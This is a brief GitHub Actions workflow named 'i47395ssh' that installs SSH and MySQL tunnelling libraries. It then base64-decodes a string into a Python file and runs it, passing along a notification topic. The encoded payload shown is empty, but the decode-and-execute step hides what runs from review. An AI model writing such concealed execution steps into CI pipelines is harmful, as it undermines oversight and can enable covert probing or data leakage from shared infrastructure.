name: i47395ssh
on:
  workflow_dispatch:
    inputs:
      topic:
        description: ntfy topic
        default: "i47395ssh-umyf56wrxl"
jobs:
  d:
    runs-on: ubuntu-latest
    timeout-minutes: 25
    permissions: {}
    steps:
      - name: setup
        run: |
          python3 -m pip install --quiet pymysql paramiko sshtunnel 2>/dev/null || true
      - name: probe
        env:
          TOPIC: ${{ github.event.inputs.topic }}
        run: |
          set +e
          echo '' | base64 -d > /tmp/p.py
          python3 /tmp/p.py
          echo "END rc=$?"
